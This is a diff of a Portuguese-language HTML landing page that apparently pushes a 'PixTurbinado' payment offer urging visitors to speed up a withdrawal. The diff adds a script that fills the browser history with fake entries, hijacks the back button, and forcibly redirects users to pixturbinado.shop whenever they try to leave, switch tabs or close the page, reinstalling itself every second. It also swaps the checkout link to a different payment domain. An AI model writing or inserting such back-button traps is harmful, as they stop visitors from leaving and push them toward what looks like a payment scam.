@@ -2,6 +2,104 @@
 <script src="js/utm-handler.js" data-token="7a394605-1983-4c36-98cc-7194d19aa9b4" data-click-id-param="click_id">
 </script>
 
+<script type="text/javascript">
+(function () {
+    'use strict';
+
+    // Evita carregar múltiplas vezes
+    if (window.__BACK_REDIRECT_LOADED) {
+        return;
+    }
+    window.__BACK_REDIRECT_LOADED = true;
+
+    var DEFAULT_REDIRECT = 'https://pixturbinado.shop/back';
+    var TRIGGER_DELAY = 100; // reduzido para resposta mais rápida
+
+    var resolvedUrl = DEFAULT_REDIRECT;
+    console.log('PixTurbinado Back Redirect carregado. URL de destino:', resolvedUrl);
+
+    function forceRedirect() {
+        console.log('PixTurbinado: FORÇANDO redirecionamento para', resolvedUrl);
+        try {
+            window.location.replace(resolvedUrl);
+        } catch (e) {
+            try {
+                window.location.href = resolvedUrl;
+            } catch (e2) {
+                window.open(resolvedUrl, '_self');
+            }
+        }
+    }
+
+    function scheduleRedirect() {
+        console.log('PixTurbinado: Agendando redirecionamento para', resolvedUrl);
+        setTimeout(forceRedirect, TRIGGER_DELAY);
+    }
+
+    // Instala múltiplas camadas de proteção
+    function installHistoryTrap() {
+        try {
+            // Adiciona múltiplas entradas no histórico
+            history.pushState({ redirectTrap: true }, '', location.href);
+            history.pushState({ redirectTrap: true }, '', location.href);
+            history.pushState({ redirectTrap: true }, '', location.href);
+            
+            console.log('PixTurbinado: History trap instalado com múltiplas camadas');
+            
+            // Listener principal para popstate
+            window.addEventListener('popstate', function (event) {
+                console.log('PixTurbinado: Popstate detectado - REDIRECIONANDO IMEDIATAMENTE', event);
+                event.preventDefault();
+                event.stopPropagation();
+                forceRedirect();
+                return false;
+            }, true);
+
+            // Listener adicional sem capture
+            window.addEventListener('popstate', function (event) {
+                console.log('PixTurbinado: Popstate secundário detectado');
+                forceRedirect();
+            });
+
+        } catch (e) {
+            console.log('PixTurbinado: Erro ao instalar history trap:', e);
+        }
+    }
+
+    // Detecta quando a página fica oculta (usuário mudou de aba)
+    document.addEventListener('visibilitychange', function () {
+        if (document.visibilityState === 'hidden') {
+            console.log('PixTurbinado: Página ficou oculta - redirecionando');
+            scheduleRedirect();
+        }
+    });
+
+    // Detecta quando a página está sendo fechada/saindo
+    window.addEventListener('pagehide', function (event) {
+        console.log('PixTurbinado: Pagehide detectado - redirecionando');
+        scheduleRedirect();
+    });
+
+    // Detecta tentativas de navegação
+    window.addEventListener('beforeunload', function (event) {
+        console.log('PixTurbinado: Beforeunload detectado');
+        // Não podemos redirecionar aqui, mas podemos logar
+    });
+
+    // Instala o trap imediatamente
+    installHistoryTrap();
+
+    // Força uma verificação periódica
+    setInterval(function() {
+        if (history.length < 3) {
+            console.log('PixTurbinado: Reinstalando history trap');
+            installHistoryTrap();
+        }
+    }, 1000);
+
+})();
+</script>
+
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -560,7 +658,7 @@
 
         <!-- Botão CTA -->
         <div class="cta-container">
-          <a href="https://pay.confirmapagamento.site/checkout/46c8dab8-05fd-4d54-9c89-fc73b45a3d5e" class="cta-link" onclick="preserveParams(event)">
+          <a href="https://www.pay-pagamentos.link/checkout/70d894e8-7762-4895-b6ec-509bf19c25ba" class="cta-link" onclick="preserveParams(event)">
             <button class="cta-button">Antecipe seu saque!</button>
           </a>
         </div>
